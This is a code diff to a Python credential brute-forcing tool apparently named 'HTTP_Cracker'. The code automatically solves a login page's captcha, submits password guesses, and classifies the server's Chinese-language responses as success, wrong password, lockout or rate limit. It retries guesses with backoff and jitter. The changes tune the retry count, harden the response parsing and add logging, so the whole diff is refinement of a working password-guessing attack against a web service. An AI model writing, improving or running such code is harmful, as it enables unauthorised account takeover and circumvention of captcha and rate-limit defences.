@@ -12,7 +12,7 @@ from src.utils.crypto import encrypt_aes, generate_headers
 logger = logging.getLogger("HTTP_Cracker")
 
 # Constants
-MAX_RETRIES = 50  # Max attempts per password before giving up
+MAX_RETRIES = 15  # Max attempts per password before giving up
 BASE_BACKOFF = 1.0  # Initial sleep time for network errors
 MAX_BACKOFF = 20.0  # Max sleep time for network errors
 
@@ -32,6 +32,7 @@ def check_login(sess, username, password):
         # 1. Get Captcha
         cid, code = solve_captcha(sess)
         if not cid or not code:
+            logger.warning("Captcha solution failed (empty cid/code)")
             return "ERROR"
 
         # 2. Prepare headers with encryption
@@ -52,31 +53,36 @@ def check_login(sess, username, password):
         if resp.status_code == 200:
             data = resp.json()
             status = data.get("status")
-            message = data.get("message", "")
+            # Ensure message is a string even if None in JSON
+            message = data.get("message") or ""
+            # Ensure data_content is a dict even if None in JSON
+            data_content = data.get("data") or {}
 
             # Case: Success
-            if status == "success" or "token" in data.get("data", {}):
+            if status == "success" or "token" in data_content:
                 return "SUCCESS"
 
             # Case: Failure
             if "验证码" in message:
                 return "FAIL_CAPTCHA"
-            elif "密码" in message or "账号" in message:
+            elif "密码" in message or "账号" in message or "非法" in message:
                 return "FAIL_PASS"
             elif "锁定" in message:
                 return "FAIL_LOCK"
             elif "频繁" in message or "limit" in message.lower():
                 return "FAIL_RATE_LIMIT"
             else:
+                logger.warning(f"Unknown response: {message}")
                 # Default to FAIL_PASS on unknown error to avoid stalling,
                 # but valid responses usually fall in categories above.
                 return "FAIL_PASS"
 
         else:
+            logger.warning(f"HTTP Status {resp.status_code}")
             return "ERROR"
 
     except Exception as e:
-        # logger.debug(f"Request exception: {e}")
+        logger.warning(f"Request exception: {e}")
         return "ERROR"
 
 
@@ -118,6 +124,9 @@ def worker(stop_event, progress_queue, username, password, day_prefix):
         elif result == "FAIL_CAPTCHA":
             # Retry immediately with same password
             retry_count += 1
+            if retry_count % 5 == 0:
+                logger.warning(f"⚠️ Captcha failed {retry_count} times for {password}")
+
             # Reset net errors since we got a valid response (even if captcha wrong)
             consecutive_net_errors = 0
             # Small sleep to be polite
@@ -138,6 +147,9 @@ def worker(stop_event, progress_queue, username, password, day_prefix):
             # Network error, sleep with exponential backoff
             retry_count += 1
             consecutive_net_errors += 1
+
+            if retry_count % 5 == 0:
+                logger.warning(f"⚠️ Network error {retry_count} times for {password}")
 
             sleep_time = min(BASE_BACKOFF * (1.5**consecutive_net_errors), MAX_BACKOFF)
             # Add jitter
